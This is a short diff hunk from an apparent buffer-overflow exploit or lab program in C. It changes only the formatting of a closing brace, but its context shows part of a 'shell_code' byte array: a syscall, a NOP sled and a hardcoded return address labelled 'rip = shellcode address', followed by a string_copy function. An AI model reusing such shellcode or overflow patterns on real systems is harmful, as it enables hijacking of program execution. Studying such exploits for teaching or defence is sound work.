@@ -31,7 +31,7 @@ static char shell_code[] = {
   	0x0f,0x05,                               // syscall
 	0x90,0x90,0x90,                          // nop
 	0xa0,0xde,0xff,0xff,0xff,0x7f,0x00,0x00, // rip = shellcode address
-	};
+};
 
 static int string_copy(char * src)
 {
